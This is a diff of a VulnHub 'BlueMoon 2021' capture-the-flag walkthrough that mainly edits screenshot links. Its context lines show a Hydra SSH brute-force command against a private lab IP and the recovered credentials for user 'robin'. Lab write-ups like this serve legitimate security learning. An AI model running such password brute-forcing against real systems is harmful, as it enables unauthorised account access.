@@ -113,7 +113,7 @@ cat p_lists.txt
 
 > `information.txt` reveals a username: **robin**  
 > `p_lists.txt` is a password list
-![alt text]()
+
 ---
 
 ## Step 7 — Brute Force SSH with Hydra
@@ -121,13 +121,14 @@ cat p_lists.txt
 ```bash
 hydra -l robin -P p_lists.txt ssh://192.168.56.101
 ```
-![alt text]()
+![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/454f19d586ec1ec75f8ca2f5f17bc23256241f9a/images/hydra.png)
+
 **Credentials found:**
 ```
 Login: robin
 Password: k4rv3ndh4nh4ck3r
 ```
-![alt text]()
+
 ---
 
 ## Step 8 — SSH Login & First Flag
